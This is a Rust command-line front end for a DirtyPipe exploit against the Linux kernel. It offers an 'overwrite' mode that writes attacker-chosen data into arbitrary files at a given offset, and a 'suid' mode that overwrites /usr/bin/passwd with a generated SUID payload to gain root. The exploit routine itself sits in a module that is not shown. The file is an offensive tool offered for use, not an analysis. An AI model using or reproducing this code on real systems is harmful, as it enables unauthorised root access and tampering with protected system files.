use anyhow::{Result, anyhow};
use structopt::StructOpt;
use std::path::{Path, PathBuf};
use std::fs;

mod exploit;

#[derive(Debug, StructOpt)]
#[structopt(name = "DirtyPipe Exploit", about = "Exploit DirtyPipe to overwrite arbitrary files or gain root.")]
struct Opt {
    /// Mode. Can be "overwrite" or "suid"
    #[structopt(short, long)]
    mode: String,

    /// Input file. This data is what is written to the overwritten file.
    #[structopt(short, long)]
    input: Option<PathBuf>,

    /// Output file. The file to overwrite.
    #[structopt(short, long)]
    output: Option<PathBuf>,

    /// Offset to begin overwriting.
    #[structopt(short="b", long,)]
    offset: Option<i64>,
}

fn main() -> Result<(), anyhow::Error> {
    let opt = Opt::from_args();

    match opt.mode.as_str() {
        "overwrite" => {
            let input = opt.input.expect("input file is required in overwrite mode.");
            let output = opt.output.expect("output file is required in overwrite mode.");
            let offset = opt.offset.expect("offset is required in overwrite mode.");

            return exploit::exploit(input, output, offset);
        }
        
        "suid" => {
            // Ensure payload exists.
            if !Path::new("./suid").exists() {
                return Err(anyhow!("SUID payload must be generated using the provided python script!"));
            }
            

            return exploit::exploit("./suid".into(), "/usr/bin/passwd".into(), 0);
        }

        _ => {
             return Err(anyhow!("Mode must be overwrite or suid."));
        }
    }

    Ok(())
}
